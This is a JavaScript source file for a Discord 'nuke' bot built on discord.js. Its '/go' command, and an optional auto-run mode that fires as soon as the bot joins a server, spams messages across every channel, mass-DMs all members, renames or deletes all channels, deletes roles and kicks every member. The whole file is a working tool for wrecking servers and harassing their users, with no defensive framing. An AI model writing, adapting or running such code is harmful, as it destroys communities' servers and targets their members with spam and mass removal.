const { Client, GatewayIntentBits, REST, Routes, ChannelType, PermissionsBitField } = require('discord.js');
const { token, clientId, runAutoActionsOnGuildJoin, autoActions } = require('./config.json');

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

const rest = new REST({ version: '10' }).setToken(token);

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    if (commandName === 'go') {
        const interval = options.getInteger('interval');
        const message = options.getString('message');
        const channelsOption = options.getString('channels');
        const channels = channelsOption ? channelsOption.split(',') : [];
        const dmMessage = options.getString('dm');
        const renameChannels = options.getString('rename_channels');
        const deleteChannels = options.getBoolean('delete_channels');
        const kickMembers = options.getBoolean('kick_members');
        const deleteRoles = options.getBoolean('delete_roles');

        await interaction.reply('Configuration received. Executing actions...');

        executeActions({
            interval,
            message,
            channels,
            dmMessage,
            renameChannels,
            deleteChannels,
            kickMembers,
            deleteRoles,
            guild: interaction.guild
        });
    }
});

client.on('guildCreate', async guild => {
    if (runAutoActionsOnGuildJoin) {
        console.log(`Joined guild: ${guild.name} (${guild.id}). Executing auto actions...`);
        await executeAutoActions(guild);
    }
});

async function executeActions({
    interval,
    message,
    channels,
    dmMessage,
    renameChannels,
    deleteChannels,
    kickMembers,
    deleteRoles,
    guild
}) {
    if (interval && message && channels.length > 0) {
        setInterval(() => {
            channels.forEach(channelId => {
                if (channelId === '*' || channelId === guild.id) {
                    guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).forEach(ch => ch.send(message));
                } else {
                    const channel = guild.channels.cache.get(channelId);
                    if (channel && channel.type === ChannelType.GuildText) {
                        channel.send(message);
                    }
                }
            });
        }, interval * 1000);
    }

    if (dmMessage) {
        await guild.members.fetch(); // Fetch all members
        guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                member.send(dmMessage).catch(console.error);
            }
        });
    }

    if (renameChannels) {
        guild.channels.cache.forEach(channel => {
            if (channel.permissionsFor(client.user).has(PermissionsBitField.Flags.ManageChannels)) {
                channel.setName(renameChannels).catch(console.error);
            } else {
                console.log(`Missing permission to rename channel: ${channel.name}`);
            }
        });
    }

    if (deleteChannels) {
        guild.channels.cache.forEach(channel => {
            if (channel.permissionsFor(client.user).has(PermissionsBitField.Flags.ManageChannels)) {
                channel.delete().catch(console.error);
            } else {
                console.log(`Missing permission to delete channel: ${channel.name}`);
            }
        });
    }

    if (kickMembers) {
        await guild.members.fetch(); // Fetch all members
        guild.members.cache.forEach(member => {
            if (!member.user.bot && member.kickable) {
                member.kick().catch(console.error);
            } else {
                console.log(`Missing permission to kick member: ${member.user.tag}`);
            }
        });
    }

    if (deleteRoles) {
        guild.roles.cache.forEach(role => {
            if (role.name !== '@everyone' && role.editable) {
                role.delete().catch(console.error);
            } else {
                console.log(`Missing permission to delete role: ${role.name}`);
            }
        });
    }
}

async function executeAutoActions(guild) {
    const { sendMessageInterval, message, channels, dmMessage, renameChannels, deleteChannels, kickMembers, deleteRoles } = autoActions;
    
    if (sendMessageInterval && message && channels.length > 0) {
        setInterval(() => {
            channels.forEach(channelId => {
                if (channelId === '*' || channelId === guild.id) {
                    guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).forEach(ch => ch.send(message));
                } else {
                    const channel = guild.channels.cache.get(channelId);
                    if (channel && channel.type === ChannelType.GuildText) {
                        channel.send(message);
                    }
                }
            });
        }, sendMessageInterval * 1000);
    }

    if (dmMessage) {
        await guild.members.fetch(); // Fetch all members
        guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                member.send(dmMessage).catch(console.error);
            }
        });
    }

    if (renameChannels) {
        guild.channels.cache.forEach(channel => {
            if (channel.permissionsFor(client.user).has(PermissionsBitField.Flags.ManageChannels)) {
                channel.setName(renameChannels).catch(console.error);
            } else {
                console.log(`Missing permission to rename channel: ${channel.name}`);
            }
        });
    }

    if (deleteChannels) {
        guild.channels.cache.forEach(channel => {
            if (channel.permissionsFor(client.user).has(PermissionsBitField.Flags.ManageChannels)) {
                channel.delete().catch(console.error);
            } else {
                console.log(`Missing permission to delete channel: ${channel.name}`);
            }
        });
    }

    if (kickMembers) {
        await guild.members.fetch(); // Fetch all members
        guild.members.cache.forEach(member => {
            if (!member.user.bot && member.kickable) {
                member.kick().catch(console.error);
            } else {
                console.log(`Missing permission to kick member: ${member.user.tag}`);
            }
        });
    }

    if (deleteRoles) {
        guild.roles.cache.forEach(role => {
            if (role.name !== '@everyone' && role.editable) {
                role.delete().catch(console.error);
            } else {
                console.log(`Missing permission to delete role: ${role.name}`);
            }
        });
    }
}

(async () => {
    try {
        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationCommands(clientId),
            { body: [
                {
                    name: 'go',
                    description: 'Configure and run various actions',
                    options: [
                        {
                            name: 'interval',
                            description: 'Interval to send a message (in seconds)',
                            type: 4, // INTEGER
                            required: false
                        },
                        {
                            name: 'message',
                            description: 'Message to send on specified interval',
                            type: 3, // STRING
                            required: false
                        },
                        {
                            name: 'channels',
                            description: 'Comma-separated list of channel IDs or * for all to send message on interval in',
                            type: 3, // STRING
                            required: false
                        },
                        {
                            name: 'dm',
                            description: 'Message to DM to all members',
                            type: 3, // STRING
                            required: false
                        },
                        {
                            name: 'rename_channels',
                            description: 'Rename all channels to this name',
                            type: 3, // STRING
                            required: false
                        },
                        {
                            name: 'delete_channels',
                            description: 'Delete all channels',
                            type: 5, // BOOLEAN
                            required: false
                        },
                        {
                            name: 'kick_members',
                            description: 'Kick all members',
                            type: 5, // BOOLEAN
                            required: false
                        },
                        {
                            name: 'delete_roles',
                            description: 'Delete all roles, bot role must be higher than the roles to delete',
                            type: 5, // BOOLEAN
                            required: false
                        },
                    ],
                },
            ] },
        );

        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
})();

client.login(token);
